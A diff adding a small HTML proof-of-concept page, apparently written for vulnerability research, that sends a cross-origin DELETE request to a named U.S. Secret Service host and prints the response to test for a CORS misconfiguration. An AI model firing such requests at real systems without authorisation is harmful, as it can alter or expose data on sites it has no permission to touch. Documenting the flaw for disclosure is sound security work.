@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS Misconfig PoC - USSS</title>
+  </head>
+  <body>
+    <h2>Sending Cross-Origin DELETE Request</h2>
+    <p>If the CORS misconfig exists, the response below should show something instead of a CORS error:</p>
+    <script>
+      fetch("https://pix.secretservice.gov/errors/page-not-found", {
+        method: "DELETE"
+      })
+      .then(res => res.text())
+      .then(text => {
+        document.body.innerHTML += "<pre>" + text + "</pre>";
+      })
+      .catch(err => {
+        document.body.innerHTML += "<pre>Error: " + err + "</pre>";
+      });
+    </script>
+  </body>
+</html>
